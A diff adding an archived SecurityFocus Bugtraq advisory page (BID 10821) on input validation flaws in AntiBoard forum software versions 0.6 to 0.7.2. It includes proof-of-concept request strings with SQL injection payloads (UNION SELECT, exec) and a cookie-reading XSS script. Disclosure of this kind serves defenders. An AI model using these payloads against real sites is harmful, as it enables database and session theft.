@@ -1,0 +1,113 @@
+#SpeeDr00t@Black Falcon<br>#bid10821<p><b><span style="font-size: 18pt;">AntiBoard Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/10821/info">info</a><br><a href="http://www.securityfocus.com/bid/10821/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/10821/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/10821/solution">solution</a><br><a href="http://www.securityfocus.com/bid/10821/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				10821
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 28 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 28 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to Josh Gilmour &lt;gilmourj@gmail.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					AntiBoard AntiBoard 0.63 <br/>
+					
+				
+					AntiBoard AntiBoard 0.62 <br/>
+					
+				
+					AntiBoard AntiBoard 0.61 <br/>
+					
+				
+					AntiBoard AntiBoard 0.7.2 <br/>
+					
+				
+					AntiBoard AntiBoard 0.7.1 <br/>
+					
+				
+					AntiBoard AntiBoard 0.7 <br/>
+					
+				
+					AntiBoard AntiBoard 0.6 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following proof of concept examples are available:<br/>/antiboard.php?thread_id=1%20UNION%20ALL%20select%20field%20from%20whatever--&amp;mode=threaded&amp;sort_order=<br/><br/>/antiboard.php?range=all&amp;mode=threaded&amp;thread_id=1&amp;reply=1&amp;parent_id=1%20UNION%20ALL%20select%20field%20from%20whatever--<br/><br/>/antiboard.php?range=all&amp;thread_id=1%20UNION%20ALL%20select%20field%20from%20whatever--&amp;sort_order=ASC&amp;mode=threaded<br/><br/>/antiboard.php?thread_id=1&amp;parent_id=1%20UNION%20ALL%20select%20field%20from%20whatever--&amp;mode=nested&amp;reply=1<br/><br/>poster_name=1111&amp;poster_email=1111&amp;message_title=1111&amp;message_body=1111&amp;submit=Submit%2bmessage&amp;thread_id=3&amp;mode=1';%20exec%20whatever--&amp;range=&amp;parent_id=0&amp;reply=reply<br/><br/>POST antiboard.php poster_name=1111&amp;poster_email=1111&amp;message_title=1111&amp;message_body=1111&amp;submit=Submit%2bmessage&amp;thread_id=3&amp;mode=threaded&amp;range=&amp;parent_id=1%20UNION<br/>ALL select field from antiboard_emails----&amp;reply=reply<br/><br/>/antiboard.php?thread_id=1&amp;mode=threaded&amp;range=&amp;feedback=&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt;
+	
+		<ul>
+</ul>
+</div>
